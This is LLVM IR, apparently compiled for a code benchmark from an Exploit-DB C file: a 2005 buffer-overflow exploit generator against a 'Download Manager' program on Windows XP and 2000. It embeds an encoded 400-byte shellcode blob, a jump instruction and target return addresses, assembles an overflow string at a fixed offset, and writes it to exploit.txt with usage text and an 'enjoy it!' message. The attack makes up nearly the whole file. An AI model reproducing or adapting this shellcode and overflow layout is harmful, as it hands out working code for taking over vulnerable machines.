; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_1091.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_1091.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@__const.main.crap4 = private unnamed_addr constant [4 x i8] c"11.\00", align 1
@__const.main.shellcode = private unnamed_addr constant [400 x i8] c"\D9\EE\D9t$\F4[1\C9\B1^\81s\17O\85/\98\83\EB\FC\E2\F4\B3my\98O\85|\CD\19\D2\A4\F4k\9D\A4\DDs\0E{\9D7\84\C5\13\05\9D\A4\C2o\84\C4{}\CC\A4\AC\C4\84\C1\A9\B0y\1EX\E3\BD\CF\ECHD\E0\95NB\C4jt\F9\0B\8C:d\A4\C2k\84\C4\FE\C4\89d\13\15\99.s\C4\81\A4\99\A7n-\A9\8F\DAq\C5\14G'\98\11\EF\1F\C1+\0E6\13\14\89\A4\C3S\0E4\13\14\8D|\F0\C1\CB!t\B0S\A6_\CEi/\99O\85x\CE\1C\0C\CAph\85/\98\DF\84/\98\F9\9C7\7F\EB\9C_q\AA\CC\A9\D1\EB\9F__\EB(\01q\96\8C\DA5\84h\D3\A3\18\D6\1D\C7|\B7/\C3\C2\CE\0F\C9\B0R\A6G\C6F\A2\ED[\EF(\C1\1E\D6\D0\AC\C0zz\9C\16\0C+\16\ADw\04\BF\1Bz\18g\1A\B5\1EX\1F\D5\7F\C8\0F\D5o\C8\B0\D0\03\11\88\B4\F4\CB\1C\ED-\98^\D9\A6x%\95\7F\CF\B0\D0\0B\CB\18zz\B0\1C\D1xg\1A\A5\A6_'\C6b\DCO\0C\CC\1F\B5\B4\EF\153\A1\83\F2Z\DC\DC3\C8\7F\ACt\1BCk\BC_\C1I_\0B\A1\13\99N\0CS\BC\07\0CS\BC\03\0CS\BC\1F\08k\BC_\D1\7F\C9\1E\D4n\C9\06\D4~\CB\1EzZ\98'\F7\D1+Yzz\9C\B0U\A6~\B0\F0/\F0\E2\\*V\B0\D0+\11\8C\EF\D0gyz\FCg:\85Gh\C5\81pg\1A\81\1EC\1Cz\FF\98\00", align 16
@size = common dso_local global i32 0, align 4
@__const.main.jmp = private unnamed_addr constant [5 x i8] c"\EB\0C\90\90\00", align 1
@__const.main.winxp = private unnamed_addr constant [5 x i8] c"\B1,\C2w\00", align 1
@__const.main.win2000 = private unnamed_addr constant [5 x i8] c"\08\B0\01x\00", align 1
@.str = private unnamed_addr constant [43 x i8] c"\0A-------- Download Manager remote exploit\0A\00", align 1
@.str.1 = private unnamed_addr constant [43 x i8] c"-------- copyrighted by c0d3r of IHS 2005\0A\00", align 1
@.str.2 = private unnamed_addr constant [33 x i8] c"-------- usage : dlm.exe target\0A\00", align 1
@.str.3 = private unnamed_addr constant [68 x i8] c"-------- target 1 : windows xp all service packs all languages : 0\0A\00", align 1
@.str.4 = private unnamed_addr constant [70 x i8] c"-------- target 2 : windows 2000 all service packs all languages : 1\0A\00", align 1
@.str.5 = private unnamed_addr constant [25 x i8] c"-------- eg : dlm.exe 0\0A\00", align 1
@.str.6 = private unnamed_addr constant [55 x i8] c"-------- out file will be exploit.txt for windows xp\0A\0A\00", align 1
@.str.7 = private unnamed_addr constant [44 x i8] c"\0A[-] this target doesnt exist in the list\0A\0A\00", align 1
@.str.8 = private unnamed_addr constant [35 x i8] c"-------- building overflow string\0A\00", align 1
@NOP = common dso_local global i32 0, align 4
@.str.9 = private unnamed_addr constant [17 x i8] c"-------- Done !\0A\00", align 1
@.str.10 = private unnamed_addr constant [40 x i8] c"-------- Creating the exploit.txt file\0A\00", align 1
@exploit = common dso_local global i32 0, align 4
@.str.11 = private unnamed_addr constant [3 x i8] c"w+\00", align 1
@.str.12 = private unnamed_addr constant [28 x i8] c"-------- Done ! enjoy it !\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca [4 x i8], align 1
  %7 = alloca [400 x i8], align 16
  %8 = alloca i32*, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i64, align 8
  %11 = alloca i32, align 4
  %12 = alloca [5 x i8], align 1
  %13 = alloca [5 x i8], align 1
  %14 = alloca [5 x i8], align 1
  %15 = alloca [5 x i8], align 1
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %16 = bitcast [4 x i8]* %6 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %16, i8* align 1 getelementptr inbounds ([4 x i8], [4 x i8]* @__const.main.crap4, i32 0, i32 0), i64 4, i1 false)
  %17 = bitcast [400 x i8]* %7 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 16 %17, i8* align 16 getelementptr inbounds ([400 x i8], [400 x i8]* @__const.main.shellcode, i32 0, i32 0), i64 400, i1 false)
  %18 = load i32, i32* @size, align 4
  %19 = zext i32 %18 to i64
  %20 = call i8* @llvm.stacksave()
  store i8* %20, i8** %9, align 8
  %21 = alloca i8, i64 %19, align 16
  store i64 %19, i64* %10, align 8
  %22 = bitcast [5 x i8]* %13 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %22, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.main.jmp, i32 0, i32 0), i64 5, i1 false)
  %23 = bitcast [5 x i8]* %14 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %23, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.main.winxp, i32 0, i32 0), i64 5, i1 false)
  %24 = bitcast [5 x i8]* %15 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 1 %24, i8* align 1 getelementptr inbounds ([5 x i8], [5 x i8]* @__const.main.win2000, i32 0, i32 0), i64 5, i1 false)
  %25 = load i32, i32* %4, align 4
  %26 = icmp slt i32 %25, 2
  br i1 %26, label %27, label %36

27:                                               ; preds = %2
  %28 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str, i64 0, i64 0))
  %29 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.1, i64 0, i64 0))
  %30 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.2, i64 0, i64 0))
  %31 = call i32 @printf(i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.3, i64 0, i64 0))
  %32 = call i32 @printf(i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.4, i64 0, i64 0))
  %33 = call i32 @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.5, i64 0, i64 0))
  %34 = call i32 @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.6, i64 0, i64 0))
  %35 = call i32 @exit(i32 -1) #5
  unreachable

36:                                               ; preds = %2
  %37 = load i8**, i8*** %5, align 8
  %38 = getelementptr inbounds i8*, i8** %37, i64 1
  %39 = load i8*, i8** %38, align 8
  %40 = call i64 @atoi(i8* %39)
  %41 = trunc i64 %40 to i16
  %42 = zext i16 %41 to i32
  store i32 %42, i32* %11, align 4
  %43 = load i32, i32* %11, align 4
  switch i32 %43, label %52 [
    i32 0, label %44
    i32 1, label %48
  ]

44:                                               ; preds = %36
  %45 = getelementptr inbounds [5 x i8], [5 x i8]* %12, i64 0, i64 0
  %46 = getelementptr inbounds [5 x i8], [5 x i8]* %14, i64 0, i64 0
  %47 = call i32 @strcat(i8* %45, i8* %46)
  br label %55

48:                                               ; preds = %36
  %49 = getelementptr inbounds [5 x i8], [5 x i8]* %12, i64 0, i64 0
  %50 = getelementptr inbounds [5 x i8], [5 x i8]* %15, i64 0, i64 0
  %51 = call i32 @strcat(i8* %49, i8* %50)
  br label %55

52:                                               ; preds = %36
  %53 = call i32 @printf(i8* getelementptr inbounds ([44 x i8], [44 x i8]* @.str.7, i64 0, i64 0))
  %54 = call i32 @exit(i32 -1) #5
  unreachable

55:                                               ; preds = %48, %44
  %56 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str, i64 0, i64 0))
  %57 = call i32 @printf(i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.1, i64 0, i64 0))
  %58 = call i32 @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.8, i64 0, i64 0))
  %59 = load i32, i32* @NOP, align 4
  %60 = load i32, i32* @size, align 4
  %61 = call i32 @memset(i8* %21, i32 %59, i32 %60)
  %62 = getelementptr inbounds [4 x i8], [4 x i8]* %6, i64 0, i64 0
  %63 = call i32 (i8*, ...) @memcpy(i8* %21, i8* %62, i64 3)
  %64 = getelementptr inbounds i8, i8* %21, i64 3
  %65 = getelementptr inbounds i8, i8* %64, i64 2077
  %66 = getelementptr inbounds [5 x i8], [5 x i8]* %13, i64 0, i64 0
  %67 = call i32 (i8*, ...) @memcpy(i8* %65, i8* %66, i32 4)
  %68 = getelementptr inbounds i8, i8* %21, i64 3
  %69 = getelementptr inbounds i8, i8* %68, i64 2077
  %70 = getelementptr inbounds i8, i8* %69, i64 4
  %71 = getelementptr inbounds [5 x i8], [5 x i8]* %12, i64 0, i64 0
  %72 = call i32 (i8*, ...) @memcpy(i8* %70, i8* %71, i32 4)
  %73 = getelementptr inbounds i8, i8* %21, i64 3
  %74 = getelementptr inbounds i8, i8* %73, i64 2077
  %75 = getelementptr inbounds i8, i8* %74, i64 4
  %76 = getelementptr inbounds i8, i8* %75, i64 40
  %77 = getelementptr inbounds [400 x i8], [400 x i8]* %7, i64 0, i64 0
  %78 = call i32 (i8*, ...) @memcpy(i8* %76, i8* %77, i64 399)
  %79 = load i32, i32* @size, align 4
  %80 = sext i32 %79 to i64
  %81 = getelementptr inbounds i8, i8* %21, i64 %80
  store i8 0, i8* %81, align 1
  %82 = call i32 @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.9, i64 0, i64 0))
  %83 = call i32 @printf(i8* getelementptr inbounds ([40 x i8], [40 x i8]* @.str.10, i64 0, i64 0))
  %84 = load i32, i32* @exploit, align 4
  %85 = call i32* @fopen(i32 %84, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.11, i64 0, i64 0))
  store i32* %85, i32** %8, align 8
  %86 = trunc i64 %19 to i32
  %87 = load i32*, i32** %8, align 8
  %88 = call i32 @fwrite(i8* %21, i32 1, i32 %86, i32* %87)
  %89 = load i32*, i32** %8, align 8
  %90 = call i32 @fclose(i32* %89)
  %91 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str.12, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  %92 = load i8*, i8** %9, align 8
  call void @llvm.stackrestore(i8* %92)
  %93 = load i32, i32* %3, align 4
  ret i32 %93
}

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #1

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

declare dso_local i32 @printf(i8*) #3

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #4

declare dso_local i64 @atoi(i8*) #3

declare dso_local i32 @strcat(i8*, i8*) #3

declare dso_local i32 @memset(i8*, i32, i32) #3

declare dso_local i32 @memcpy(i8*, ...) #3

declare dso_local i32* @fopen(i32, i8*) #3

declare dso_local i32 @fwrite(i8*, i32, i32, i32*) #3

declare dso_local i32 @fclose(i32*) #3

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { argmemonly nounwind willreturn }
attributes #2 = { nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
